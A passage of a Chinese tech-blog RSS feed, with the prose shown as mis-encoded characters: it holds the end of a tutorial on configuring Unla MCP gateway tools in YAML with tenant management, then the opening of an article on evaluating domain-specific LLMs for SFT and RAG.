        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>               <span class="hljs-comment"># é»˜è®¤å€¼</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>               <span class="hljs-comment"># è¯·æ±‚ä½“æ¨¡æ¿ï¼Œç”¨äºåŠ¨æ€ç”Ÿæˆè¯·æ±‚ä½“ï¼Œå¦‚ï¼šä»å‚æ•°ï¼ˆMCPçš„è¯·æ±‚argumentsï¼‰ä¸­æå–çš„å€¼</span>
      {
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-</span>              <span class="hljs-comment"># å“åº”ä½“æ¨¡æ¿ï¼Œç”¨äºåŠ¨æ€ç”Ÿæˆå“åº”ä½“ï¼Œå¦‚ï¼šä»å“åº”ä¸­æå–çš„å€¼</span>
      {
        <span class="hljs-attr">"id":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.id}}</span>"</span>,
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.email}}</span>"</span>,
        <span class="hljs-attr">"createdAt":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.createdAt}}</span>"</span>
      }

  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"get_user_by_email"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Get user by email"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"GET"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/email/<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}"
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_preferences"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user preferences"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"PUT"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/preferences"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"isPublic"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether the user profile is public"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"false"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"showEmail"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether to show email in profile"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"true"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"theme"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User interface theme"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"light"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"tags"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
          <span class="hljs-attr">enum:</span> [<span class="hljs-string">"developer"</span>, <span class="hljs-string">"designer"</span>, <span class="hljs-string">"manager"</span>, <span class="hljs-string">"tester"</span>]
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User role tags"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"settings"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User custom settings as key-value pairs"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"{}"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"notifications"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User notification preferences"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
          <span class="hljs-attr">properties:</span>
            <span class="hljs-attr">type:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification type (email, push, sms)"</span>
            <span class="hljs-attr">channel:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification channel (marketing, system, security)"</span>
            <span class="hljs-attr">enabled:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether this notification is enabled"</span>
            <span class="hljs-attr">frequency:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"number"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification frequency (0: realtime, 1: daily, 2: weekly, 3: monthly)"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>                   <span class="hljs-comment"># toJSONï¼šå¯¹éJSONåŸç”Ÿæ”¯æŒçš„ç±»å‹è½¬ä¸ºJSONæ ¼å¼</span>
      {
        <span class="hljs-attr">"isPublic":</span> {{<span class="hljs-string">.Args.isPublic</span>}},
        <span class="hljs-attr">"showEmail":</span> {{<span class="hljs-string">.Args.showEmail</span>}},
        <span class="hljs-attr">"theme":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.theme}}</span>"</span>,
        <span class="hljs-attr">"tags":</span> {{<span class="hljs-string">.Args.tags</span>}},
        <span class="hljs-attr">"settings":</span> {{ <span class="hljs-string">toJSON</span> <span class="hljs-string">.Args.settings</span> }},
        <span class="hljs-attr">"notifications":</span> {{ <span class="hljs-string">.Args.notifications</span> }}
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}",
        "preferences": {
          "isPublic": {{.Response.Data.preferences.isPublic}},
          "showEmail": {{.Response.Data.preferences.showEmail}},
          "theme": "{{.Response.Data.preferences.theme}}",
          "tags": {{.Response.Data.preferences.tags}},
          "settings": {{ toJSON .Response.Data.preferences.settings }},
          "notifications": {{ toJSON .Response.Data.preferences.notifications }}
        }
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user avatar using a URL via multipart form"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/avatar"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email of the user"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"url"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"form-data"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"The avatar image URL"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "message": "{{.Response.Data.message}}",
        "avatarUrl": "{{.Response.Data.avatarUrl}}"
      }
</span></code></pre>
<ul>
<li><strong>ç½‘å…³å¤„ç†é€»è¾‘</strong>ï¼š
å½“ AI å®¢æˆ·ç«¯è¯·æ±‚è¯¥å·¥å…·æ—¶ï¼ŒUnla ç½‘å…³ä¼šè‡ªåŠ¨æ„é€  HTTP è¯·æ±‚å‘å¾€åç«¯ï¼Œå¹¶å°†ç»“æœå°è£…ä¸º MCP å“åº”è¿”å›ã€‚</li>
</ul>
<h4 data-id="heading-4">ä¸‰ã€ å®¢æˆ·ç«¯æ¥å…¥</h4>
<p>é…ç½®å®Œæˆåï¼Œä½ éœ€è¦è®©ä½ çš„ AI å®¢æˆ·ç«¯ï¼ˆå¦‚  Dify, Cursor, Claude Desktopï¼‰è¿æ¥åˆ° Unla ç½‘å…³ã€‚</p>
<ol>
<li><strong>è·å–æ¥å…¥ç‚¹ URL</strong>ï¼š
åœ¨ Unla æ§åˆ¶é¢æ¿æŸ¥çœ‹ç”Ÿæˆ SSE å’Œ HTTP ä¸¤ç§ç±»å‹çš„ç«¯ç‚¹åœ°å€ï¼Œé€šå¸¸æ ¼å¼ä¸ºï¼š<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/sse</code>å’Œ<code>http://&lt;your-gateway-ip&gt;:5235/{tenant_id}/&lt;server-name&gt;/mcp</code></li>
<li><strong>åœ¨å®¢æˆ·ç«¯é…ç½®</strong>ï¼ˆä»¥ Dify ä¸ºä¾‹ï¼‰ï¼š
<ul>
<li>å·¥å…· -&gt; MCP -&gt; æ·»åŠ MCPæœåŠ¡ã€‚</li>
<li>æ·»åŠ â€œæœåŠ¡ç«¯ç‚¹ï¼Œåç§°ï¼ŒæœåŠ¡å™¨æ ‡è¯†ç¬¦ï¼Œè¯·æ±‚å¤´â€ç­‰ä¿¡æ¯</li>
</ul>
</li>
</ol>
<h4 data-id="heading-5">å››ã€ç§Ÿæˆ·ç®¡ç†</h4>
<h5 data-id="heading-6">1. ç§Ÿæˆ·çš„ä½œç”¨</h5>
<p>åœ¨ Unla ä¸­ï¼Œç§Ÿæˆ·ï¼ˆTenantï¼‰æ˜¯ä¸€ä¸ªé€»è¾‘éš”ç¦»å•ä½ã€‚å…¶ä¸»è¦ç”¨é€”åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šä¸åŒé¡¹ç›®ç»„æˆ–éƒ¨é—¨å¯ä»¥æ‹¥æœ‰ç‹¬ç«‹çš„ MCP Server é›†åˆï¼Œäº’ä¸å¹²æ‰°ã€‚</li>
<li><strong>é…ç½®å¤ç”¨</strong>ï¼šå¯ä»¥åœ¨ä¸åŒç§Ÿæˆ·ä¸‹é…ç½®åŒåçš„ Serverï¼ˆå¦‚ <code>prod-db</code> å’Œ <code>dev-db</code>ï¼‰ï¼Œé€šè¿‡ç§Ÿæˆ· ID è¿›è¡ŒåŒºåˆ†ã€‚</li>
<li><strong>å®‰å…¨åˆè§„</strong>ï¼šä¸ºæ¯ä¸ªç§Ÿæˆ·åˆ†é…ç‹¬ç«‹çš„ <code>API Key</code> æˆ– <code>JWT Secret</code>ï¼Œç¡®ä¿ A ç§Ÿæˆ·æ— æ³•è°ƒç”¨ B ç§Ÿæˆ·çš„å·¥å…·ã€‚</li>
</ul>
<h5 data-id="heading-7">2. ç§Ÿæˆ·åœ¨ç½‘å…³å‰ç¼€ï¼ˆGateway Prefixï¼‰ä¸­çš„åŒ¹é…é€»è¾‘</h5>
<p>Unla ç½‘å…³é€šè¿‡ URL è·¯å¾„ä¸­çš„å‰ç¼€æ¥è¯†åˆ«è¯·æ±‚æ‰€å±çš„ç§Ÿæˆ·å’ŒæœåŠ¡ã€‚</p>
<p>æ ‡å‡†çš„è·¯ç”±åŒ¹é…æ ¼å¼é€šå¸¸å¦‚ä¸‹ï¼š
<code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/sse</code> æˆ– <code>http://&lt;gateway-host&gt;:&lt;port&gt;/{tenant_id}/{server_name}/mcp</code></p>
<hr/>
<h4 data-id="heading-8">äº”ã€æ“ä½œå»ºè®®</h4>
<ol>
<li><strong>å…ˆåˆ›å»ºç§Ÿæˆ·</strong>ï¼šåœ¨ Web UI çš„ <strong>"ç§Ÿæˆ·ç®¡ç†"</strong> æ¨¡å—åˆ›å»ºç§Ÿæˆ·ï¼Œå¹¶è®°å½•å…¶ <code>ID</code>ã€‚</li>
<li><strong>ç»‘å®š Server</strong>ï¼šåœ¨åˆ›å»ºç½‘å…³ä»£ç†é…ç½®æ—¶ï¼ŒåŠ¡å¿…é€‰æ‹©æ‰€å±çš„ <strong>"ç§Ÿæˆ·"</strong>ã€‚</li>
<li><strong>è·¯ç”±é…ç½®</strong>ï¼šè·¯ç”±å‰ç¼€å¿…é¡»ä»¥ <strong>"ç§Ÿæˆ·ID"</strong> å¼€å¤´ï¼Œå¦åˆ™å¤±è´¥ã€‚</li>
<li><strong>æ­£ç¡®YAMLé…ç½®æ–‡ä»¶æ ¼å¼</strong>ï¼šé€šè¿‡YAMLæ¨¡å¼è¿›è¡Œç½‘å…³é…ç½®æ—¶ï¼Œç¡®ä¿æ­£ç¡®çš„ç¼©è¿›ï¼Œå¦åˆ™ä¼šå¤±è´¥ã€‚</li>
<li><strong>æ­£ç¡®çš„JSONæ ¼å¼æ•°æ®</strong>ï¼šåœ¨é…ç½®è¯·æ±‚æˆ–å“åº”Bodyæ—¶ï¼Œå¯¹éJSONåŸç”Ÿæ”¯æŒçš„æ•°æ®ç±»å‹é€šè¿‡<code>toJSON</code>è¿›è¡Œè½¬æ¢ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7594791357144383530</link>    <guid>https://juejin.cn/post/7594791357144383530</guid>    <pubDate>2026-01-14T11:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144383530" data-draft-id="7594791357144367146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T11:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:29:48.000Z" title="Wed Jan 14 2026 11:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æœŸè§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CRrVB7Eb4%2F" target="_blank" title="https://www.bilibili.com/video/BV1CRrVB7Eb4/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1CRâ€¦</a></p>
<hr/>
<ul>
<li>å¦‚ä½•è¯„ä¼°æ¨¡å‹åœ¨å‚ç›´é¢†åŸŸä¸‹çš„è¡¨ç°ï¼Ÿ</li>
<li>å¦‚ä½•è¯„ä¼°æ¨¡å‹å¾®è°ƒå‰åçš„æ•ˆæœï¼Ÿ</li>
<li>å¦‚ä½•é‡åŒ– RAG ç³»ç»Ÿçš„å¬å›ç‡ï¼Ÿ</li>
<li>å¦‚ä½•ä»é¢†åŸŸçŸ¥è¯†åˆ›å»ºæ¨¡å‹è¯„ä¼°æ•°æ®é›†ï¼Ÿ</li>
</ul>
<hr/>
<p>å¤§å®¶å¥½ï¼Œæ¬¢è¿æ¥åˆ° codeç§˜å¯†èŠ±å›­ï¼Œæˆ‘æ˜¯èŠ±å›­è€å¸ˆï¼ˆConardLiï¼‰ã€‚</p>
<p>ç°åœ¨å¤§å®¶éƒ½åœ¨æå¤§æ¨¡å‹è½åœ°ï¼Œä¸ç®¡æ˜¯åš RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰è¿˜æ˜¯ SFTï¼ˆç›‘ç£å¾®è°ƒï¼‰ï¼Œæœ€è®©å¼€å‘è€…å¤´ç§ƒçš„å…¶å®ä¸æ˜¯ â€œæ€ä¹ˆè®­ç»ƒâ€ï¼Œè€Œæ˜¯ â€œæ€ä¹ˆçŸ¥é“è®­ç»ƒå¾—å¥½ä¸å¥½â€ã€‚</p>
<p>åœ¨ä¸Šä¸€æœŸæ•™ç¨‹ï¼šã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FkQIcb6gggF5wf08qjuJcyQ" target="_blank" title="https://mp.weixin.qq.com/s/kQIcb6gggF5wf08qjuJcyQ" ref="nofollow noopener noreferrer">ä¸–ç•Œæœ€é¡¶çº§çš„å¤§æ¨¡å‹ï¼Œéƒ½åœ¨ PK äº›å•¥ï¼Ÿ ï¼ˆå¤§æ¨¡å‹è¯„ä¼°å®Œå…¨æŒ‡å—ï¼‰</a>ã€‹ ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ä»‹ç»äº†å¤§æ¨¡å‹è¯„ä¼°çš„æ ¸å¿ƒæµç¨‹å’Œä¸šç•Œä¸»æµçš„ä¸€äº›é€šç”¨ Benchmarkï¼ˆåŸºå‡†æµ‹è¯•ï¼‰ã€‚</p>
<p>è¿™äº›åŸºå‡†ä¸€èˆ¬éƒ½ç”¨äºé€šç”¨å¤§æ¨¡å‹çš„èƒ½åŠ›æµ‹è¯•ï¼Œæ¦œå•ï¼ˆåƒ <code>MMLUã€ARC</code> ï¼‰åˆ†æ•°å†é«˜ï¼Œä¸€æ—¦ç”¨åˆ°å…·ä½“çš„ä¸šåŠ¡åœºæ™¯ï¼Œæ¯”å¦‚æ³•å¾‹åˆåŒå®¡æ ¸ã€åŒ»ç–—æŠ¥å‘Šåˆ†æã€æˆ–è€…å…¬å¸å†…éƒ¨çš„ç»´ä¿®æ‰‹å†Œï¼Œè¿™äº›é€šç”¨åˆ†æ•°çš„å‚è€ƒæ„ä¹‰å°±éå¸¸æœ‰é™äº†ã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠï¼Œåœ¨å‚ç›´é¢†åŸŸï¼Œæˆ‘ä»¬å…·ä½“åº”è¯¥æ€ä¹ˆè¯„ä¼°æ¨¡å‹çš„è¡¨ç°ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f69bc972fa7478ab01abdb07c742366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7M2e%2FogNyaJjTylym0fMHqIg%2FVM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šç†è®ºç¯‡</h2>
<h3 data-id="heading-1">1. ä¸ºä»€ä¹ˆé€šç”¨è¯„ä¼°ä¸å¤Ÿç”¨ï¼Ÿ</h3>
